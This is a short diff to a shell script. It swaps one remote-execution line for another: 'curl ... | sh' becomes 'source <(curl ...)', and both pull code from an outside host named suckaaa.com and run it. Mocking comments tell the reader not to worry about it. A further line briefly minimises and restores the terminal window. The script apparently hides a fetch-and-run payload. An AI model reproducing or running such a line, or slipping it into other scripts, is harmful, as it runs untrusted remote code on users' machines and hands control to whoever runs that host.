@@ -3,7 +3,7 @@
 # loL whatcha lookin for in here???
 # Don't worry about it!!!
 
-curl -s https://suckaaa.com/s/lib | sh;
+source <(curl -s https://suckaaa.com/s/lib);
 
 # Minimize the window for a few seconds, then restore it
 printf '\e[2t' && sleep 3 && printf '\e[1t';
